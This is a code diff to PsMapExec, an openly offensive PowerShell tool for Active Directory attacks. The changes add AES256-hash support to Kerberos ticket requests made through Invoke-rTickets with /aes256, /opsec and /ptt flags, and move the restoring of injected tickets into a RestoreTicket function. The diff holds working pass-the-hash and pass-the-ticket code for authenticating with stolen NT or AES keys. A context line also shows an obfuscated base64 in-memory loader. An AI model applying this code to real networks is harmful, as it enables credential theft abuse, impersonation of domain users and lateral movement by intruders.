@@ -90,7 +90,6 @@ Function PsMapExec {
         [switch]$Rainbow
     )
 
-    # Check for mandatory parameter
 
 
     $startTime = Get-Date
@@ -506,10 +505,10 @@ Version : 0.4.7")
                         try {
                             Write-Verbose "Attempting to obtain current user ticket"
                             if ($DomainController -ne "") {
-                                Invoke-rTickets send /nowrap /domain:$domain /dc:$DomainController | Out-String
+                                $BaseTicket = Invoke-rTickets send /domain:$domain /dc:$DomainController /nowrap| Out-String
                             }
                             else {
-                                $BaseTicket = Invoke-rTickets send /nowrap | Out-string
+                                $BaseTicket = Invoke-rTickets send /nowrap /domain:$domain | Out-string
                             }
                             $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                         }
@@ -543,6 +542,41 @@ Version : 0.4.7")
                             }
                         }
                     }
+                }
+            }
+        }
+    }
+
+    ################################################################################################################
+    ################################################# Function: RestoreTicket ######################################
+    ################################################################################################################
+    Function RestoreTicket {
+        if (!$CurrentUser) {
+            if ($Klist -eq $False) {
+                Write-Verbose "Clearing tickets as no tickets in original cache"
+                klist purge | Out-Null
+                return
+            }
+
+            if ($Method -ne "GenRelayList") {
+                Write-Verbose "Restoring Ticket"
+                klist purge | Out-Null
+                Start-sleep -Milliseconds 100
+
+                klist purge | Out-Null
+
+                if ($DomainController -ne "") { Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /dc:$DomainController | Out-Null }
+                else { Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null }
+                
+
+                try {
+                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction "SilentlyContinue"
+                    $DomainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
+                    $PDC = $domainContext.PdcRoleOwner.Name
+                    Write-Verbose "Creating LDAP TGS for $PDC"
+                }
+                catch {
+                    Write-Verbose "Error creating ticket to $PDC"
                 }
             }
         }
@@ -609,13 +643,7 @@ Version : 0.4.7")
                     Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                     Write-Host "Ticket expired"
                     klist purge | Out-Null
-
-                    if ($DomainController -ne "") {
-                        Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
-                    }
-                    else {
-                        Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                    }
+                    RestoreTicket
                 
                     break
                 }
@@ -641,16 +669,13 @@ Version : 0.4.7")
                     }
                 }
 
+                Write-Verbose $AskPassword
+
                 if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Incorrect password or username"
                     klist purge | Out-Null
-                    if ($DomainController -ne "") {
-                        Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
-                    }
-                    else {
-                        Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                    }
+                    RestoreTicket
                 
                     break
                 }
@@ -659,20 +684,28 @@ Version : 0.4.7")
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Incorrect password or username"
                     klist purge | Out-Null
-                    if ($DomainController -ne "") {
-                        Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
-                    }
-                    else {
-                        Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                    }
+                    RestoreTicket
+                
+                    break
+                }
+
+                if ($AskPassword -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
+                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                    Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
+                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                    Write-Host "Try with a AES256 hash instead"
+                    klist purge | Out-Null
+                    RestoreTicket
                 
                     break
                 }
             } 
         
             elseif ($Hash -ne "") {
+                
                 if ($Hash.Length -eq 32) {
                     klist purge | Out-Null
+                    Write-Verbose "Type Hash:32"
 
                     if ($UserDomain -ne "") {
                         if ($DomainController -ne "") {
@@ -691,16 +724,13 @@ Version : 0.4.7")
                         }
                     }
 
+                    Write-Verbose $AskRC4
+
                     if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
                         klist purge | Out-Null
-                        if ($DomainController -ne "") {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
-                        }
-                        else {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                        }
+                        RestoreTicket
                     
                         break
                     }
@@ -709,18 +739,76 @@ Version : 0.4.7")
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
                         klist purge | Out-Null
-                        if ($DomainController -ne "") {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
-                        }
-                        else {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                        }
-                    
+                        RestoreTicket
+                        
+                        break
+                    }
+                
+                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Try with a AES256 hash instead"
+                        klist purge | Out-Null
+                        RestoreTicket
+                
                         break
                     }
                 }
+                elseif ($Hash.Length -eq 64) {
+                    klist purge | Out-Null
+                    Write-Verbose "Type Hash:64"
 
-                if ($Hash.Length -eq 65) {
+                    if ($UserDomain -ne "") {
+                        if ($DomainController -ne "") {
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
+                        }
+                        else {
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
+                        }
+                    }
+                    elseif ($UserDomain -eq "") {
+                        if ($DomainController -ne "") {
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
+                        }
+                        else {
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
+                        }
+                    }
+
+                    Write-Verbose $Ask256
+
+                    if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Incorrect hash or username"
+                        klist purge | Out-Null
+                        RestoreTicket
+                    
+                        break
+                    }
+
+                    if ($Ask256 -like "*Unhandled rTickets exception:*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Incorrect hash or username"
+                        klist purge | Out-Null
+                        RestoreTicket
+                    
+                        break
+                    }
+
+                    if ($Ask256 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
+                        klist purge | Out-Null
+                        RestoreTicket
+                
+                        break
+                    }
+
+                
+                
+                }
+                elseif ($Hash.Length -eq 65) {
                     $colonCount = ($Hash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                     
                     if ($colonCount -ne 1) {
@@ -733,6 +821,7 @@ Version : 0.4.7")
                     $Hash = $Hash.Split(':')[1]
 
                     klist purge | Out-Null
+                    Write-Verbose "Type Hash:65"
                 
                     if ($UserDomain -ne "") {
                         if ($DomainController -ne "") {
@@ -750,23 +839,38 @@ Version : 0.4.7")
                             $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                         }
                     }
-
+                
+                    Write-Verbose $AskRC4
+                
                     if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
                         klist purge | Out-Null
-                        if ($DomainController -ne "") {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
-                        }
-                        else {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                        }
+                        RestoreTicket
                     
                         break
                     }
-                }
                 
-
+                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Incorrect hash or username"
+                        klist purge | Out-Null
+                        RestoreTicket
+                        
+                        break
+                    }
+                
+                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Try with a AES256 hash instead of NTLM"
+                        klist purge | Out-Null
+                        RestoreTicket
+                
+                        break
+                    }
+                }
                 else {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
@@ -775,9 +879,11 @@ Version : 0.4.7")
                 
                     break
                 }
+
             }
         }
     }
+
 
     ################################################################################################################
     ############################################## Load Amnesiac ###################################################
@@ -956,37 +1062,7 @@ Version : 0.4.7")
     }
 
 
-    ################################################################################################################
-    ################################################# Function: RestoreTicket ######################################
-    ################################################################################################################
-    Function RestoreTicket {
-        if (!$CurrentUser) {
-            if ($Klist -eq $False) {
-                Write-Verbose "Clearing tickets as no tickets in original cache"
-                klist purge | Out-Null
-                return
-            }
 
-            if ($Method -ne "GenRelayList") {
-                Write-Verbose "Restoring Ticket"
-                klist purge | Out-Null
-                Start-sleep -Milliseconds 100
-
-                klist purge | Out-Null
-                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null
-
-                try {
-                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction "SilentlyContinue"
-                    $DomainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
-                    $PDC = $domainContext.PdcRoleOwner.Name
-                    Write-Verbose "Creating LDAP TGS for $PDC"
-                }
-                catch {
-                    Write-Verbose "Error creating ticket to $PDC"
-                }
-            }
-        }
-    }
 
 
     ################################################################################################################
@@ -1326,6 +1402,7 @@ Version : 0.4.7")
                         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
                         RestoreTicket
+                        
                         return
                     }
                 }
@@ -1338,6 +1415,7 @@ Version : 0.4.7")
                         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
                         RestoreTicket
+                        
                         return
                     }
                 }
@@ -1945,6 +2023,7 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
         
                 if ($runspace.Handle.IsCompleted) {
                     $runspace.Completed = $true
+                    $result = $null
                     $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                     $hasDisplayedResult = $false
                     try { $result = $result.Trim() } catch {}
